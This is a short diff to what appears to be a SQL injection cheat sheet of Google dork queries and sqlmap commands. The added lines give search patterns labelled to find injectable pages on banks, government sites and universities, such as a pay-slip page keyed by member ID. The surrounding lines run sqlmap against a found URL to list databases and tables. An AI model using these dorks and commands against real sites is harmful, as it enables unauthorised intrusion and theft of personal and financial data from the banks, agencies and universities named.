@@ -24,6 +24,10 @@ inurl:blog.php?id=
 inurl:show.php?id=
 inurl:"/sys/sitearticles/page-articles.php?i="
 
+inurl:"branches.php?id="        Find Banks
+inurl:"/sin/news.php?id="       Find Goverment Site
+inurl:"pay_slip.php?member_id=" Find University
+inurl:"displaymember.php?id="   Find University
 sqlmap -u URL --dbs
 
 sqlmap -u URL -D @@ --tables
